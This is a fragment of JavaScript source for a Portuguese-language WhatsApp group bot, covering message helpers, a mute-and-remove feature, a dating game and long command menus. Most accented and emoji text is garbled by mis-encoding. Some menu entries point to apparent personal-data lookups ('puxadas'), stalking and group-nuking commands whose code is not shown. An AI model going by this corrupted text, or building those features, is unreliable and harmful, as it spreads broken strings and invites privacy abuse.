  const resposta = await waitForMessage(from, 30000)
  if (!resposta) return null

  const opcao = resposta.text.match(/\/opcao (\d+)/)
  if (!opcao) return null

  return opcoes[parseInt(opcao[1]) - 1]
}

// Fun√ß√£o waitForMessage
async function waitForMessage(from, tempo) {
  return new Promise(resolve => {
    const timeout = setTimeout(() => {
      resolve(null)
    }, tempo)

    amy.on('message', mensagem => {
      if (mensagem.from == from) {
        clearTimeout(timeout)
        resolve(mensagem)
      }
    })
  })
}


const min = JSON.parse(fs.readFileSync('./sandroft/edite/fotos.json'))
megu = min.megumax

const reply = (texto) => {
amy.sendMessage(from, { text: texto }, {quoted: info})
}
          
const esperar = sleep = async (tempo) => {
    return new Promise(funcao => setTimeout(funcao, tempo));
}


const msgSemQuoted = (content, type, options = {}) => {
   const isFullUrl = (url) => new RegExp(/^https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)$/, 'gi').test(url);
const mediaKeys = ['image', 'video', 'sticker', 'audio', 'document', 'history', 'md-app-state'];
options[type || 'text'] = isFullUrl(content) && mediaKeys.includes(type) ? {url: content}: content;
return amy.sendMessage(from, options, {quoted: info}).catch(e => {
reply("Erro ao reply a mensagem..");
})
}

// PRA LIMPAR DO CONTADOR QUEM N√ÉO EST√Å NO GRUPO
async function LIMPARDOCNT_QUEMJASAIU() {
var RD_CNT = countMessage[countMessage.map(i => i.groupId).indexOf(from)].numbers
CNT1 = []; for ( i of groupMembers) {CNT1.push(i.id)} 
CNT = []; for ( i of RD_CNT) {
if(!CNT1.includes(i.id)) CNT.push(i)}
for ( i of CNT) {
RD_CNT.splice(RD_CNT.map(i => i.id).indexOf(i.id), 1)}
fs.writeFileSync("./arquivos/countmsg.json", JSON.stringify(countMessage, null, 2))
}

const reagir = async (idgp, emj) => {
var reactionMessage = {
react: {
text: emj, 
key: info.key
}
} 
amy.sendMessage(idgp, reactionMessage)
}

const mencionarIMG = (teks= '', Url, ms) => {
memberr = []
vy = teks.includes('\n') ? teks.split('\n') : [teks]
for(vz of vy){ for(zn of vz.split(' ')){
if(zn.includes('@'))memberr.push(parseInt(zn.split('@')[1])+'@s.whatsapp.net')
}}
amy.sendMessage(from, {image: {url: Url}, caption: teks.trim(), mentions: memberr}, {quoted: info}) 
}



const mention = (teks= '', ms = info) => {
memberr = []
vy = teks.includes('\n') ? teks.split('\n') : [teks]
for(vz of vy){ for(zn of vz.split(' ')){
if(zn.includes('@'))memberr.push(parseInt(zn.split('@')[1])+'@s.whatsapp.net')
}}
amy.sendMessage(from, {text: teks.trim(), mentions: memberr}, {quoted: info}) 
}
const GroupsMutedActived = []
for(let obj of muted) {
    GroupsMutedActived.push(obj.jid)
}
const isMuted = (isGroup && GroupsMutedActived.indexOf(from) >= 0) ? true : false
const NumbersMuted = isMuted ? muted[GroupsMutedActived.indexOf(from)].numbers : []
if(isMuted && NumbersMuted.indexOf(sender) >= 0){
reply(`üò° Voc√™ deu um piu ?üê• - Agora prepare-se para o seu julgamento hehe!`)
setTimeout(async () => {
    amy.groupParticipantsUpdate(from, [sender], 'remove')
}, 1000)
return
}
//================//isquoted/const
const isImage = type == 'imageMessage'
const isVideo = type == 'videoMessage'
const isAudio = type == 'audioMessage'
const isSticker = type == 'stickerMessage'
const isContact = type == 'contactMessage'
const isLocation = type == 'locationMessage'
const isProduct = type == 'productMessage'
const isMedia = (type === 'imageMessage' || type === 'videoMessage' || type === 'audioMessage')
typeMessage = body.substr(0, 50).replace(/\n/g, '')
if (isImage) typeMessage = "Image"
else if (isVideo) typeMessage = "Video"
else if (isAudio) typeMessage = "Audio"
else if (isSticker) typeMessage = "Sticker"
else if (isContact) typeMessage = "Contact"
else if (isLocation) typeMessage = "Location"
else if (isProduct) typeMessage = "Product"

var PR_String = Procurar_String.toLowerCase().normalize('NFD').replace(/[\u0300-\u036f]/g, "");

var pes = (type === 'conversation' && info.message.conversation) ? info.message.conversation : (type == 'imageMessage') && info.message.imageMessage.caption ? info.message.imageMessage.caption : (type == 'videoMessage') && info.message.videoMessage.caption ? info.message.videoMessage.caption : (type == 'extendedTextMessage') && info.message.extendedTextMessage.text ? info.message.extendedTextMessage.text : ''

const isQuotedMsg = type === 'extendedTextMessage' && content.includes('textMessage')

const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')

const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')

const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')

const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')

const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')

const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')

const isQuotedProduct = type === 'extendedTextMessage' && content.includes('productMessage')
const downloadAndSaveMediaMessage = async (message, filename, attachExtension = true) => {
let quoted = message.msg ? message.msg : message
let mime = (message.msg || message).mimetype || ''
let messageType = mime.split('/')[0].replace('application', 'document') ? mime.split('/')[0].replace('application', 'document') : mime.split('/')[0]
const stream = await downloadContentFromMessage(quoted, messageType)
let buffer = Buffer.from([])
for await (const chunk of stream) {
buffer = Buffer.concat([buffer, chunk])
}
let type = await FileType.fromBuffer(buffer)
filedesbug = `${Math.floor(Math.random() * 9999)}`
trueFileName = attachExtension ? (filedesbug + '.' + type.ext) : filename
// save to file
await fs.writeFileSync(trueFileName, buffer)
return trueFileName
} 
const messagesC = PR_String.slice(0).trim().split(/ +/).shift().toLowerCase();

const exportion = JSON.parse(fs.readFileSync('./exportion.json'))

//THE SOLDIER KING 
//

const isAntiNotas = isGroup ? antinotas.includes(from) : false

const isRegistradoRemetente = sender ? isRegistrado(sender) : false;
const isregistrador = sender ? isRegistrado(sender) : true;
const isAntiPv = (antipv.indexOf('Ativado') >= 0) ? true : false	


const isBanchat = isGroup ? dataGp[0].bangp : undefined
const isModobn =  isGroup ? modobn.includes(from) : true



const isAntiFlood = isGroup ? antiflood.includes(from) : false	

const ADVT = isGroup ? dataGp[0].advertir: false
//_-_-_-_-_-_-_-_-_-_-_-_-(SISTEMA GRUPO)_-_-_-_-_-_-_-_-_-_-_-_-_-_-_--\\
const ADVT2 = isGroup ? dataGp[0].advertir2: false
const IS_DELETE = nescessario.Odelete
const isSimi2 = isGroup ? samih2.includes(from) : false

const isAntifake = isGroup ? antifake.includes(from) : false



const isAntiPorn = isGroup ? antiporn.includes(from) : true

const menc_jid = args?.join(" ").replace("@", "") + "@s.whatsapp.net"

const isSimi = isGroup ? simih.includes(from) : false

const sender_ou_n = q.includes("@") ? menc_jid : sender


const mentions = (teks, memberr, id) => {
(id == null || id == undefined || id == false) ? amy.sendMessage(from, {text: teks.trim(), mentions: memberr}) : amy.sendMessage(from, {text: teks.trim(), mentions: memberr})
}
const time = moment.tz('America/Sao_Paulo').format('HH:mm:ss');
const hora = moment.tz('America/Sao_Paulo').format('HH:mm:ss');
const date = moment.tz('America/Sao_Paulo').format('DD/MM/YY');

const time2 = moment().tz('America/Sao_Paulo').format('HH:mm:ss')
if(time2 > "00:00:00" && time2 < "05:00:00"){
var tempo = 'Boa madrugada'
} if(time2 > "05:00:00" && time2 < "12:00:00"){
var tempo = 'Bom dia'
} if(time2 > "12:00:00" && time2 < "18:00:00"){
var tempo = 'Boa tarde'
} if(time2 > "18:00:00"){
var tempo = 'Boa noite'
}

const menc_prt = info.message?.extendedTextMessage?.contextInfo?.participant

//‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏ ùôéùôÄùôáùôäùôé ‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏
const live = {key : {participant : '0@s.whatsapp.net'},message: {liveproductMessage: {}}} 
const imgm = {key : {participant : '0@s.whatsapp.net'},message: {imageMessage: {}}}
const vid = {key : {participant : '0@s.whatsapp.net'},message: {videoMessage: {}}}
const contato = {key : {participant : '0@s.whatsapp.net'},message: {contactMessage:{displayName: `${pushname}`}}}
const doc = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage:{}}}


const menc_os2 = q.includes("@") ? menc_jid : menc_prt 
//‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏ ùòæùôäùôâùôéùôäùôáùôÄ ‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏
 if (!isGroup && isCmd) console.log(
color(`ùë™ùë∂ùë¥ùë®ùëµùë´ùë∂ ùëµùë∂ ùë∑ùëπùë∞ùëΩùë®ùë´ùë∂`,'white'),'\n',
color('‚û¢ ùëµùë∂ùë¥ùë¨ ùë´ùë∂ ùë©ùë∂ùëª:','white'),color(botName, 'cyan'),'\n',
color('‚û¢ ùëºùë∫ùëºùë®ÃÅùëπùë∞ùë∂:','white'),color(pushname,'cyan'),'\n',
color('‚û¢ ùë™ùë∂ùë¥ùë®ùëµùë´ùë∂:','white'),color(budy, 'cyan'),'\n',
color('‚û¢ ùëØùë∂ùëπùë®ÃÅùëπùë∞ùë∂:','white'),color(hora,'cyan'),'\n',
color('‚™º ùë´ùë®ùëªùë®:','white'),color(data,'cyan'),'\n')

if (!isCmd && !isGroup) console.log(
color(`ùë™ùë∂ùë¥ùë®ùëµùë´ùë∂ùë∫ ùë¨ùë¥ ùëÆùëπùëºùë∑ùë∂`,'white'),'\n',
color('‚û¢ ùëµùë∂ùë¥ùë¨ ùë´ùë∂ ùë©ùë∂ùëª:','white'),color(botName, 'cyan'),'\n',
color('‚û¢ ùëºùë∫ùëºùë®ÃÅùëπùë∞ùë∂:','white'),color(pushname,'cyan'),'\n',
color('‚û¢ ùë¥ùë¨ùëµùë∫ùë®ùëÆùë¨ùë¥:','white'),color(budy,'cyan'),'\n',
color('‚û¢ ùëØùë∂ùëπùë®ÃÅùëπùë∞ùë∂:','white'),color(hora,'cyan'),'\n',
color('‚û¢ ùë´ùë®ùëªùë®:','white'),color(data,'cyan'),'\n')

if (isCmd && isGroup) console.log(
color(`ùë™ùë∂ùë¥ùë®ùëµùë´ùë∂ùë∫ ùë¨ùë¥ ùëÆùëπùëºùë∑ùë∂`,'white'),'\n',
color('‚û¢ ùëµùë∂ùë¥ùë¨ ùë´ùë∂ ùë©ùë∂ùëª:','white'),color(botName, 'cyan'),'\n',
color('‚û¢ ùëµùë∂ùë¥ùë¨ ùë´ùë∂ ùëÆùëπùëºùë∑ùë∂:','white'),color(groupName,'cyan'),'\n',
color('‚û¢ ùëºùë∫ùëºùë®ÃÅùëπùë∞ùë∂:','white'),color(pushname,'cyan'),'\n',
color('‚û¢ ùë™ùë∂ùë¥ùë®ùëµùë´ùë∂:','white'),color(budy,'cyan'),'\n',
color('‚û¢ ùëØùë∂ùëπùë®ÃÅùëπùë∞ùë∂:','white'),color(hora,'cyan'),'\n',
color('‚û¢ ùë´ùë®ùëªùë®:','white'),color(data,'cyan'),'\n')

if (!isCmd && isGroup) console.log(
color(`ùë™ùë∂ùë¥ùë®ùëµùë´ùë∂ùë∫ ùë¨ùë¥ ùëÆùëπùëºùë∑ùë∂`,'white'),'\n',
color('‚û¢ ùëµùë∂ùë¥ùë¨ ùë´ùë∂ ùë©ùë∂ùëª:','white'),color(botName, 'cyan'),'\n',
color('‚û¢ ùëµùë∂ùë¥ùë¨ ùë´ùë∂ ùëÆùëπùëºùë∑ùë∂:','white'),color(groupName,'cyan'),'\n',
color('‚û¢ ùëºùë∫ùëºùë®ÃÅùëπùë∞ùë∂:','white'),color(pushname,'cyan'),'\n',
color('‚û¢ ùë¥ùë¨ùëµùë∫ùë®ùëÆùë¨ùë¥:','white'),color(budy,'cyan'),'\n',
color('‚û¢ ùëØùë∂ùëπùë®ÃÅùëπùë∞ùë∂:','white'),color(hora,'cyan'),'\n',
color('‚û¢ ùë´ùë®ùëªùë®:','white'),color(data,'cyan'),'\n')

//‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏ ùôàùôÄùôâùôéùòºùôÇùôÄùôâùôé ‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏
msg = {
registro: `Voce nao esta registrado!\nPor favor digite ${prefix}login`,
botadm:`${tempo} eu preciso ser administrador para executar este comando `,
aguarde: "Aguarde um pouquinho",
dono: "Lamento lhe informar, mais somente o meu dono pode usar esse comando",
grupo: `Nao e poss√≠vel usar este comando no pv, somente em grupos`,
private: "So pode ser usado nao?eu pv",
premium: "Voc√™ nao e um usu√°rio premium",
adm: "S√≥ pode ser usado por um administrador do grupo",
erro: "Ocorreu uma falha no comando por favor aguarde ate meu dono ajeita", 
modobn: `Precisa ativar o modogamer no grupo use o comando ${prefix}modogame 1 *`, 
}
//‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏


const namoro1 = JSON.parse(fs.readFileSync("./database/func/namoro1.json"))
const namoro2 = JSON.parse(fs.readFileSync("./database/func/namoro2.json"))

// ñ°úÍ¶Ω‡ΩºÃ∏ÀöÔø´¬† üá¶  üá®  üá™  üáÆ  üáπ  üá¶  üá∑ 
if(budy.toLowerCase() === "s" || budy.toLowerCase() === "sim") {
if(JSON.stringify(namoro2).includes(sender) && namoro2[namoro2.map(i => i.id).indexOf(sender)].idgp == from && isGroup) {
C14 = namoro2.map(i => i.id).indexOf(sender)
C12 = namoro1.map(i => i.usu1).indexOf(namoro2[C14].pedido + "@s.whatsapp.net")
namoro1[C12].namorados = true
fs.writeFileSync("./database/func/namoro1.json", JSON.stringify(namoro1, null, 2))
namoro1.push({usu1: sender, usu2: namoro2[C14].pedido, namorados: true, idgp: from, hora: hora, data: date})
fs.writeFileSync("./database/func/namoro1.json", JSON.stringify(namoro1, null, 2))
namoro2.splice(C14, 1)
fs.writeFileSync("./database/func/namoro2.json", JSON.stringify(namoro2))
mention(`ü•≥ Felicita√ß√µes @${namoro1[C12].usu1.split('@')[0]}! O (a) seu grande amor, @${sender.split('@')[0]}, aceitou o seu pedido de namoro.\nSeu par pode ser consultado no comando: ${prefix}minhadupla`)
}
}

// ñ°úÍ¶Ω‡ΩºÃ∏ÀöÔø´¬† üá∑  üá™  üá®  üá∫  üá∏  üá¶  üá∑ 
if(budy.toLowerCase() === "n" || budy.toLowerCase().replace("√£", "a") === "nao") {
if(JSON.stringify(namoro2).includes(sender) && namoro2[namoro2.map(i => i.id).indexOf(sender)].idgp == from && isGroup) {
C14 = namoro2.map(i => i.id).indexOf(sender)
C12 = namoro1.map(i => i.usu1).indexOf(`${namoro2[C14].pedido}@s.whatsapp.net`)
mention(`Sinto muito @${namoro1[C12].usu1.split('@')[0]}! O (a) @${sender.split('@')[0]} n√£o te ama, deve est√° confuso(a) ou n√£o preparado(a) e por isso n√£o aceitou o seu pedido de namoro. üò¶`)
namoro1.splice(C12, 1)
fs.writeFileSync("./database/func/namoro1.json", JSON.stringify(namoro1, null, 2))
namoro2.splice(C14, 1)
fs.writeFileSync("./database/func/namoro2.json", JSON.stringify(namoro2))
}
}





switch(comando) {

//‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏ ùòæùòºùôéùôÄ ùôàùôÄùôâùôê ‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏

case 'menu2':
case 'menu2':
reagir(from,"üíó")
try {
let resultmenu = await prepareWAMessageMedia({ image: {url: "https://i.imgur.com/Y09p9dO.jpeg"} }, { upload: amy.waUploadToServer });

amy.relayMessage(from, {
"interactiveMessage": {
"carouselMessage": {
"cards": [
{
"header": {
"title": `‚ï≠‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ïÆ
‚îÉ${prefix}    MEMBRO 
‚ï∞‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ïØ
‚îÉ${prefix}·õÉ USER‚ßΩ ${pushname}
‚îÉ${prefix}·õÉ DONO‚ßΩ ${donoName}
‚îÉ${prefix}·õÉ PREFIXO‚ßΩ ${prefix} 
‚îÉ${prefix}·õÉ DATA‚ßΩ ${data}
‚îÉ${prefix}·õÉ HORA‚ßΩ ${hora}
‚ï≠‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ïÆ
‚îÉ${prefix}         MENU 
‚ï∞‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ïØ
‚îÉ${prefix}criador
‚îÉ${prefix}igstalk
‚îÉ${prefix}metadinha
‚îÉ${prefix}figurinhas [ 40 ]
‚îÉ${prefix}arma [ nome ]
‚îÉ${prefix}calcular [ 2+9 ]
‚îÉ${prefix}ping
‚îÉ${prefix}perfil
‚îÉ${prefix}imagens
‚îÉ${prefix}brasileirao
‚îÉ${prefix}gerarlink
‚îÉ${prefix}suicidio [ autoban ]
‚îÉ${prefix}fazernick [ nome ]
‚îÉ${prefix}rankativo
‚îÉ${prefix}correio 
‚îÉ${prefix}fakechat
‚îÉ${prefix}letra [ nome ]
‚îÉ${prefix}toimg
‚îÉ${prefix}imagepralink
‚ï≠‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ïÆ
‚îÉ${prefix}      REPORT
‚ï∞‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ïØ
‚îÉ${prefix}report
‚îÉ${prefix}novocmd
‚îÉ${prefix}suporte`, 
"hasMediaAttachment": true,
"imageMessage": resultmenu.imageMessage
},
"headerType": 'IMAGE',
"body": {
"title": ``, 
},
"nativeFlowMessage": {
 buttons: [
{
"name": "cta_url",
                  "buttonParamsJson": "{\"display_text\":\"·¥Ä·¥ç è  ô·¥è·¥õ \",\"url\":\"\",\"merchant_url\":\"\"}"
,},                                     
]
}
},
{
"header": {
"title": `‚ï≠‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ïÆ
‚îÉ${prefix}       LOGO 1 TXT
‚ï∞‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ïØ
‚îÉ${prefix}angelwing
‚îÉ${prefix}blackpink
‚îÉ${prefix}girlmascote
‚îÉ${prefix}logogame
‚îÉ${prefix}fpsmascote
‚îÉ${prefix}equipemascote 
‚îÉ${prefix}ping
‚îÉ${prefix}hackneon
‚îÉ${prefix}mascotegame
‚îÉ${prefix}ffavatar
‚îÉ${prefix}wingeffect
‚îÉ${prefix}angelglx 
‚îÉ${prefix}gizquadro
‚îÉ${prefix}txtquadrinhos
‚îÉ${prefix}starballons 
‚îÉ${prefix}3dsilver
‚îÉ${prefix}frozen 
‚îÉ${prefix}goldtext
‚ï≠‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ïÆ
‚îÉ${prefix}      WALLPAPERS
‚ï∞‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ïØ
‚îÉ${prefix}wallvermelho
‚îÉ${prefix}wallverde
‚îÉ${prefix}wallroxo
‚îÉ${prefix}wallrosa
‚îÉ${prefix}wallpreto 
‚îÉ${prefix}wallmulti
‚îÉ${prefix}wallmarrom
‚îÉ${prefix}wallllaranja
‚îÉ${prefix}walldark
‚îÉ${prefix}wallcinza
‚îÉ${prefix}wallciano 
‚îÉ${prefix}walllbranco`, 
"hasMediaAttachment": true,
"imageMessage": resultmenu.imageMessage
},
"headerType": 'IMAGE',
"body": {
"title": ``, 
},
"nativeFlowMessage": {
 buttons: [
{
"name": "cta_url",
                  "buttonParamsJson": "{\"display_text\":\"·¥Ä·¥ç è  ô·¥è·¥õ \",\"url\":\"\",\"merchant_url\":\"\"}"
,},                                     
]
}
}, 
{
"header": {
"title": `‚îÉ${prefix}walllbranco
‚îÉ${prefix}wallazulclaro
‚îÉ${prefix}wallazul 
‚îÉ${prefix}wallamarelo
‚îÉ${prefix}wall4k 
‚îÉ${prefix}wallanime
‚ï≠‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ïÆ
‚îÉ${prefix}       DOWNLOADS
‚ï∞‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ïØ
‚îÉ${prefix}play
‚îÉ${prefix}play2
‚îÉ${prefix}play3
‚îÉ${prefix}play4
‚îÉ${prefix}play5
‚îÉ${prefix}play6 
‚îÉ${prefix}playmix
‚îÉ${prefix}play_video
‚îÉ${prefix}playvideo
‚îÉ${prefix}playmeme
‚îÉ${prefix}pinterest
‚îÉ${prefix}pinterest2 
‚îÉ${prefix}kwai_mp4
‚îÉ${prefix}kwai_mp3
‚îÉ${prefix}tiktok_video 
‚îÉ${prefix}tiktok_audio
‚îÉ${prefix}face_video 
‚îÉ${prefix}face_audio
‚îÉ${prefix}capcut
‚îÉ${prefix}insta_video
‚îÉ${prefix}insta_audio
‚îÉ${prefix}ytmp4
‚îÉ${prefix}ytmp3 
‚îÉ${prefix}mememp3
‚îÉ${prefix}mediafire
‚îÉ${prefix}download-link  
‚îÉ${prefix}url`, 
"hasMediaAttachment": true,
"imageMessage": resultmenu.imageMessage
},
"headerType": 'IMAGE',
"body": {
"title": ``, 
},
"nativeFlowMessage": {
 buttons: [
{
"name": "cta_url",
                  "buttonParamsJson": "{\"display_text\":\"·¥Ä·¥ç è  ô·¥è·¥õ \",\"url\":\"\",\"merchant_url\":\"\"}"
,},                                     
]
}
},
{
"header": {
"title":`‚ï≠‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ïÆ
‚îÉ${prefix}      EFEITOS IMG
‚ï∞‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ïØ
‚îÉ${prefix}affect
‚îÉ${prefix}comunismo
‚îÉ${prefix}mms
‚îÉ${prefix}bobross
‚îÉ${prefix}bolsonaro
‚îÉ${prefix}blur 
‚îÉ${prefix}karaba
‚îÉ${prefix}reautiful
‚îÉ${prefix}circle
‚îÉ${prefix}del
‚îÉ${prefix}invert
‚îÉ${prefix}facepalm 
‚îÉ${prefix}jail
‚îÉ${prefix}rip
‚îÉ${prefix}pixelate 
‚îÉ${prefix}trash
‚îÉ${prefix}merda 
‚îÉ${prefix}borrar
‚îÉ${prefix}hitler
‚îÉ${prefix}procurado
‚îÉ${prefix}deletem
‚îÉ${prefix}preso
‚îÉ${prefix}morto 
‚îÉ${prefix}lgbt
‚îÉ${prefix}lixo
‚ï≠‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ïÆ
‚îÉ${prefix}           DONO
‚ï∞‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ïØ
‚îÉ${prefix}rmv-perfil  
‚îÉ${prefix}nome-perfil  
‚îÉ${prefix}recado
‚îÉ${prefix}perfil-bot   
‚îÉ${prefix}reiniciar`, 
"hasMediaAttachment": true,
"imageMessage": resultmenu.imageMessage
},
"headerType": 'IMAGE',
"body": {
"title":  ``,
},
"nativeFlowMessage": {
 buttons: [
{
"name": "cta_url",
                  "buttonParamsJson": "{\"display_text\":\"·¥Ä·¥ç è  ô·¥è·¥õ \",\"url\":\"\",\"merchant_url\":\"\"}"
,},                                     
]
}
},
{
"header": {
"title": `‚îÉ${prefix}index-bot  
‚îÉ${prefix}getcase
‚îÉ${prefix}get
‚îÉ${prefix}apagar
‚îÉ${prefix}entrar
‚îÉ${prefix}cases 
‚îÉ${prefix}nuke
‚îÉ${prefix}listagp
‚îÉ${prefix}sairdogp
‚îÉ${prefix}listavip
‚îÉ${prefix}delvip
‚îÉ${prefix}addvip 
‚îÉ${prefix}servip
‚îÉ${prefix}unbangp
‚îÉ${prefix}bangp 
‚îÉ${prefix}sermembro
‚îÉ${prefix}seradm 
‚îÉ${prefix}prefixo-bot 
‚ï≠‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ïÆ
‚îÉ${prefix}     ADMINISTRA√á√ÉO
‚ï∞‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ïØ
‚îÉ${prefix}marcar
‚îÉ${prefix}rmfotogp
‚îÉ${prefix}fotogp
‚îÉ${prefix}linkgp
‚îÉ${prefix}status 
‚îÉ${prefix}idgp
‚îÉ${prefix}descgp
‚îÉ${prefix}nomegp
‚îÉ${prefix}roletarussa
‚îÉ${prefix}limpar
‚îÉ${prefix}banf
‚îÉ${prefix}ban
‚îÉ${prefix}mute
‚îÉ${prefix}marcarwa 
‚îÉ${prefix}totag`, 
"hasMediaAttachment": true,
"imageMessage": resultmenu.imageMessage
},
"headerType": 'IMAGE',
"body": {
"title": ``, 
},
"nativeFlowMessage": {
 buttons: [
{
"name": "cta_url",
                  "buttonParamsJson": "{\"display_text\":\"·¥Ä·¥ç è  ô·¥è·¥õ \",\"url\":\"\",\"merchant_url\":\"\"}"
,},                                     
]
}
}
]
}
}
},{
});
} catch(e) {
reagir(from,"‚ùå")
}
break
  



case 'cariflex': case 'Cariflex':
reply("O menu foi enviado no seu pv")
try {
amy.sendMessage(sender, {image: {url: `https://i.imgur.com/pwU0RSI.jpeg`}, caption: `‚ï≠‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ïÆ
‚îÉ          CARIFLEX
‚ï∞‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ïØ
‚îÉ${prefix}key 
‚îÉ${prefix}users
‚ï≠‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ïÆ
‚îÉ        CASES API
‚ï∞‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ïØ
‚îÉ${prefix}baixadores
‚îÉ${prefix}montagens
‚îÉ${prefix}puxadas
‚îÉ${prefix}pesquisa
‚îÉ${prefix}hentais
‚îÉ${prefix}edits
‚îÉ${prefix}animes
‚îÉ${prefix}ais/gpts
‚îÉ${prefix}calcular [ 2+9 ]
‚îÉ${prefix}ping
‚îÉ${prefix}perfil
‚îÉ${prefix}imagens
‚îÉ${prefix}brasileirao
‚îÉ${prefix}gerarlink
‚îÉ${prefix}suicidio [ autoban ]
‚îÉ${prefix}fazernick [ nome ]
‚îÉ${prefix}rankativo
‚îÉ${prefix}correio 
‚îÉ${prefix}fakechat
‚îÉ${prefix}letra [ nome ]
‚îÉ${prefix}toimg
‚îÉ${prefix}pensador
‚îÉ${prefix}imagepralink
‚ï∞‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ïØ`}, {quoted: live})
} catch (error) {
console.log(e)
}
break 

case 'menu':
await amy.sendMessage(
from,
{image: 
{url: `https://files.catbox.moe/0mhilb.jpg`}, 
caption: `
‚ï≠‚ä∞‚ùñ·ØΩ‚ïê‚ô°‚Ä¢‚ä∞‚ùñ‚ä±‚Ä¢‚ô°‚ïê·ØΩ‚ùñ‚ä±‚ïÆ  
       ùêåùêÑùêçùêî ùêèùêëùêàùêçùêÇùêàùêèùêÄùêã
‚ï∞‚ä∞‚ùñ·ØΩ‚ô°‚ïê‚Ä¢‚ä∞‚ùñ‚ä±‚Ä¢‚ïê‚ô°·ØΩ‚ùñ‚ä±‚ïØ

‚ï≠‚ä∞‚ùñ·ØΩ‚ïê‚ô°‚Ä¢‚ä∞‚ùñ‚ä±‚Ä¢‚ô°‚ïê·ØΩ‚ùñ‚ä±‚ïÆ
‚îÉ‚ùêñ•®${prefix}menuplay
‚îÉ‚ùêñ•®${prefix}menuefeitos
‚îÉ‚ùêñ•®${prefix}menudono
‚îÉ‚ùêñ•®${prefix}brincadeiras
‚îÉ‚ùêñ•®${prefix}menuadm
